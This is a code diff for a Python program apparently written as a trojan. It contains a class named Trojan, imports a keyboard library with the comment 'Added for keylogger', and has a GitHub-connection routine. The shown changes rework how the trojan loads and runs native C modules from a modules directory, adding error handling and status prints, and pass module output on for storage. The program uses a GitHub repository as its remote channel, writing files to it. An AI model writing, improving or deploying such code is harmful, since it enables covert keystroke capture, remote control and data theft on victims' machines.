@@ -9,9 +9,9 @@ import time
 import subprocess
 import requests
 import ctypes
+import os
 from datetime import datetime
 from pynput import keyboard  # Added for keylogger
-import os  # Needed to check and load C modules
 
 # Define a function to connect to GitHub
 def github_connect():
@@ -137,21 +137,31 @@ class Trojan:
         self.repo.create_file(remote_path, message, bindata)
 
     def load_c_module(self, module_name):
+        module_path = os.path.join('modules', module_name)
         if os.name == 'nt':  # Windows
-            return ctypes.CDLL(f"{module_name}.dll")
+            module_path += '.dll'
         else:  # Linux
-            return ctypes.CDLL(f"./{module_name}.so")
+            module_path += '.so'
+        
+        try:
+            print(f"[*] Loading C module from path: {module_path}")
+            return ctypes.CDLL(module_path)
+        except Exception as e:
+            print(f"Error loading C module {module_name} from {module_path}: {e}")
+            return None
 
     def run_c_module(self, module_name):
         try:
+            print(f"[*] Attempting to load C module: {module_name}")
             c_module = self.load_c_module(module_name)
-            # Assuming the C module has a function named 'run'
-            run_func = c_module.run
-            run_func.restype = ctypes.c_char_p
-            result = run_func()
-            result = result.decode('utf-8')
-            print(result)
-            self.send_command_result(module_name, result)
+            if c_module is not None:
+                run_func = c_module.run
+                run_func.restype = ctypes.c_char_p
+                result = run_func()
+                print(f"[*] C module '{module_name}' executed with result: {result.decode()}")
+                self.store_module_result(result.decode())
+            else:
+                print(f"[*] Failed to load C module: {module_name}")
         except Exception as e:
             print(f"Error running C module {module_name}: {e}")
 
